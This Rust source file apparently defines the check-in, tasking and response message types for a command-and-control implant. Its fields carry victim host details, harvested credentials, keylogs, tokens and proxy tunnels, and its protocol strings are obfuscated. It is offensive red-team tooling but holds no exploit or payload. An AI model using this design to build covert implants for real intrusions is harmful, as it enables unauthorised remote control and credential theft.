//! Core agent messages: checkin, get_tasking, post_response.

use alloc::string::String;
use alloc::vec::Vec;

#[cfg(feature = "json")]
use serde::{Deserialize, Serialize};

#[cfg(feature = "json")]
use serde_json::Value;

use super::features::*;

// ---------------------------------------------------------------------------
// Check-in
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CheckinRequest {
    pub action: String,
    pub uuid: String,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub ips: Vec<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub os: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub user: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub host: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub pid: Option<u32>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub architecture: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub domain: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub integrity_level: Option<u32>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub external_ip: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub encryption_key: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub decryption_key: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub process_name: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub cwd: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub impersonation_context: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub sleep_info: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub extra_info: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub delegates: Vec<Delegate>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub alerts: Vec<Alert>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub edges: Vec<Edge>,
}

impl CheckinRequest {
    pub fn new(payload_uuid: impl Into<String>) -> Self {
        Self {
            action: obfstring!("checkin"),
            uuid: payload_uuid.into(),
            ips: Vec::new(),
            os: None,
            user: None,
            host: None,
            pid: None,
            architecture: None,
            domain: None,
            integrity_level: None,
            external_ip: None,
            encryption_key: None,
            decryption_key: None,
            process_name: None,
            cwd: None,
            impersonation_context: None,
            sleep_info: None,
            extra_info: None,
            delegates: Vec::new(),
            alerts: Vec::new(),
            edges: Vec::new(),
        }
    }

    pub fn with_ips(mut self, ips: Vec<String>) -> Self {
        self.ips = ips;
        self
    }
    pub fn with_os(mut self, os: impl Into<String>) -> Self {
        self.os = Some(os.into());
        self
    }
    pub fn with_user(mut self, user: impl Into<String>) -> Self {
        self.user = Some(user.into());
        self
    }
    pub fn with_host(mut self, host: impl Into<String>) -> Self {
        self.host = Some(host.into());
        self
    }
    pub fn with_pid(mut self, pid: u32) -> Self {
        self.pid = Some(pid);
        self
    }
    pub fn with_architecture(mut self, arch: impl Into<String>) -> Self {
        self.architecture = Some(arch.into());
        self
    }
    pub fn with_domain(mut self, domain: impl Into<String>) -> Self {
        self.domain = Some(domain.into());
        self
    }
    pub fn with_integrity_level(mut self, level: u32) -> Self {
        self.integrity_level = Some(level);
        self
    }
    pub fn with_external_ip(mut self, ip: impl Into<String>) -> Self {
        self.external_ip = Some(ip.into());
        self
    }
    pub fn with_process_name(mut self, name: impl Into<String>) -> Self {
        self.process_name = Some(name.into());
        self
    }
    pub fn with_cwd(mut self, cwd: impl Into<String>) -> Self {
        self.cwd = Some(cwd.into());
        self
    }
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CheckinResponse {
    pub action: String,
    pub id: String,
    pub status: String,
}

impl CheckinResponse {
    pub fn success(callback_uuid: impl Into<String>) -> Self {
        Self {
            action: obfstring!("checkin"),
            id: callback_uuid.into(),
            status: obfstring!("success"),
        }
    }

    pub fn is_success(&self) -> bool {
        self.status == obfstring!("success")
    }
}

// ---------------------------------------------------------------------------
// Tasks
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Task {
    pub command: String,
    pub parameters: String,
    pub timestamp: f64,
    pub id: String,
}

#[derive(Debug, Clone, PartialEq, Default)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct TaskResponse {
    pub task_id: String,

    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub user_output: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub completed: Option<bool>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub status: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub error: Option<String>,

    #[cfg(feature = "json")]
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub process_response: Option<Value>,

    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub file_browser: Option<FileBrowserEntry>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub removed_files: Vec<RemovedFile>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub credentials: Vec<Credential>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub artifacts: Vec<Artifact>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub processes: Option<ProcessListing>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub edges: Vec<Edge>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub commands: Vec<CommandUpdate>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub keylogs: Vec<Keylog>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub tokens: Vec<Token>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub callback_tokens: Vec<CallbackToken>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub download: Option<Download>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub upload: Option<Upload>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub alerts: Vec<Alert>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub agent_rpc: Option<AgentRpc>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub callback: Option<CallbackUpdate>,
}

impl TaskResponse {
    pub fn new(task_id: impl Into<String>) -> Self {
        Self {
            task_id: task_id.into(),
            ..Default::default()
        }
    }

    pub fn with_output(mut self, output: impl Into<String>) -> Self {
        self.user_output = Some(output.into());
        self
    }

    pub fn completed(mut self) -> Self {
        self.completed = Some(true);
        self
    }

    pub fn with_status(mut self, status: impl Into<String>) -> Self {
        self.status = Some(status.into());
        self
    }
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct TaskResponseAck {
    pub task_id: String,
    pub status: String,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub error: Option<String>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub file_id: Option<String>,
    #[cfg(feature = "json")]
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub output: Option<Value>,
}

// ---------------------------------------------------------------------------
// Get tasking / Post response
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct GetTaskingRequest {
    pub action: String,
    pub tasking_size: i32,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Option::is_none"))]
    pub get_delegate_tasks: Option<bool>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub delegates: Vec<Delegate>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub responses: Vec<TaskResponse>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub socks: Vec<SocksMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub rpfwd: Vec<RpfwdMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub interactive: Vec<InteractiveMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub alerts: Vec<Alert>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub edges: Vec<Edge>,
}

impl GetTaskingRequest {
    pub fn new(tasking_size: i32) -> Self {
        Self {
            action: obfstring!("get_tasking"),
            tasking_size,
            get_delegate_tasks: None,
            delegates: Vec::new(),
            responses: Vec::new(),
            socks: Vec::new(),
            rpfwd: Vec::new(),
            interactive: Vec::new(),
            alerts: Vec::new(),
            edges: Vec::new(),
        }
    }

    /// Request all pending tasks (`tasking_size = -1`).
    pub fn all() -> Self {
        Self::new(-1)
    }
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct GetTaskingResponse {
    pub action: String,
    #[cfg_attr(feature = "json", serde(default))]
    pub tasks: Vec<Task>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub delegates: Vec<Delegate>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub responses: Vec<TaskResponseAck>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub socks: Vec<SocksMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub rpfwd: Vec<RpfwdMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub interactive: Vec<InteractiveMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub alerts: Vec<Alert>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub edges: Vec<Edge>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct PostResponseRequest {
    pub action: String,
    pub responses: Vec<TaskResponse>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub delegates: Vec<Delegate>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub socks: Vec<SocksMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub rpfwd: Vec<RpfwdMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub interactive: Vec<InteractiveMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub alerts: Vec<Alert>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub edges: Vec<Edge>,
}

impl PostResponseRequest {
    pub fn new(responses: Vec<TaskResponse>) -> Self {
        Self {
            action: obfstring!("post_response"),
            responses,
            delegates: Vec::new(),
            socks: Vec::new(),
            rpfwd: Vec::new(),
            interactive: Vec::new(),
            alerts: Vec::new(),
            edges: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct PostResponseResponse {
    pub action: String,
    #[cfg_attr(feature = "json", serde(default))]
    pub responses: Vec<TaskResponseAck>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub delegates: Vec<Delegate>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub socks: Vec<SocksMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub rpfwd: Vec<RpfwdMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub interactive: Vec<InteractiveMessage>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub alerts: Vec<Alert>,
    #[cfg_attr(feature = "json", serde(default, skip_serializing_if = "Vec::is_empty"))]
    pub edges: Vec<Edge>,
}
